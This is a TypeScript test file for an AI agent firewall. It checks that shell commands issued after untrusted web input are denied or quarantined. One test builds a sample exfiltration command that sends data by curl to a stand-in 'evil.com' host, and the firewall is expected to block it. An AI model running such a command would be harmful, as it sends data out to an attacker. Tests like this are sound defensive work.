/**
 * Tests that shell tool calls emit metadata.commandLength in events,
 * enabling Rule 5 (tainted_shell_with_data) to trigger when a long
 * command follows untrusted taint.
 */

import { unlinkSync } from "node:fs";
import { resolve } from "node:path";
import { type PolicyRule, ToolCallDeniedError, getPreset } from "@arikernel/core";
import { afterEach, describe, expect, it } from "vitest";
import { type Firewall, createFirewall } from "../src/index.js";

const auditFiles: string[] = [];

function auditPath(name: string): string {
	const path = resolve(import.meta.dirname, `test-shell-cmdlen-${name}-${Date.now()}.db`);
	auditFiles.push(path);
	return path;
}

afterEach(() => {
	for (const f of auditFiles) {
		try {
			unlinkSync(f);
		} catch {}
	}
	auditFiles.length = 0;
});

/** Permissive policy — lets behavioral rules be the enforcement layer. */
const ALLOW_ALL_RULES = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 500,
		match: {},
		decision: "allow" as const,
		reason: "Test: allow all",
	},
];

// The CANONICAL deny-tainted-shell policy, taken from the production preset
// (LAX boots the kernel with "workspace-assistant" — src/ari-kernel/lifecycle.ts)
// rather than a forked inline copy, so this suite exercises the exact rule that
// ships. Priority 10 — it outranks the allow-all rule above (500).
const DENY_TAINTED_SHELL: PolicyRule | undefined = getPreset("workspace-assistant").policies.find(
	(p) => p.id === "deny-tainted-shell",
);

function makeFirewall(name: string, extraPolicies: PolicyRule[] = []): Firewall {
	const fw = createFirewall({
		principal: {
			name: "test-agent",
			capabilities: [
				{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["*"] } },
				{ toolClass: "shell", actions: ["exec"] },
			],
		},
		policies: [...ALLOW_ALL_RULES, ...extraPolicies],
		auditLog: auditPath(name),
		runStatePolicy: { maxDeniedSensitiveActions: 5, behavioralRules: true },
	});

	fw.registerExecutor({
		toolClass: "http",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { body: "ok" },
				durationMs: 10,
				taintLabels: [],
			};
		},
	});
	fw.registerExecutor({
		toolClass: "shell",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { stdout: "done" },
				durationMs: 10,
				taintLabels: [],
			};
		},
	});

	return fw;
}

describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
	it("triggers quarantine when tainted run executes long shell command", async () => {
		const fw = makeFirewall("long-cmd-tainted");

		// Request grants BEFORE taint is introduced (taint-based denial would block shell grant)
		const httpGrant = fw.requestCapability("http.read");
		const shellGrant = fw.requestCapability("shell.exec");

		// Step 1: Introduce web taint via HTTP call
		await fw.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com/data" },
			taintLabels: [
				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
			],
			grantId: httpGrant.grant?.id,
		});

		// Step 2: Execute shell with a long command (>100 chars) — should trigger rule 5
		const longCommand = `curl https://evil.com/exfil?data=${"A".repeat(100)}`;

		await expect(
			fw.execute({
				toolClass: "shell",
				action: "exec",
				parameters: { command: longCommand },
				grantId: shellGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("short shell command with web taint is still blocked by the deny-tainted-shell policy", async () => {
		// The fixture must actually LOAD the policy this test names: chunk L
		// (1b47756a) removed shell from Rule 1's followups, so with allow-all
		// policies alone nothing denies a short tainted command — the deny comes
		// from the deny-tainted-shell preset policy, loaded here exactly as the
		// production "workspace-assistant" preset loads it.
		expect(DENY_TAINTED_SHELL, "workspace-assistant preset no longer carries deny-tainted-shell").toBeDefined();
		const fw = makeFirewall("short-cmd-tainted", [DENY_TAINTED_SHELL as PolicyRule]);

		const httpGrant = fw.requestCapability("http.read");
		const shellGrant = fw.requestCapability("shell.exec");

		// Introduce web taint
		await fw.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com/data" },
			taintLabels: [
				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
			],
			grantId: httpGrant.grant?.id,
		});

		// Short command: the deny-tainted-shell POLICY denies it. Chunk L removed
		// shell from Rule 1's followups (temporal FP), so the behavioral quarantine
		// no longer fires here — but the policy deny is independent and still blocks.
		await expect(
			fw.execute({
				toolClass: "shell",
				action: "exec",
				parameters: { command: "ls -la" },
				grantId: shellGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("allows long shell command when no taint present", async () => {
		const fw = makeFirewall("long-cmd-no-taint");

		const shellGrant = fw.requestCapability("shell.exec");
		const longCommand = `echo ${"A".repeat(200)}`;
		const result = await fw.execute({
			toolClass: "shell",
			action: "exec",
			parameters: { command: longCommand },
			grantId: shellGrant.grant?.id,
		});
		expect(result.success).toBe(true);
	});
});
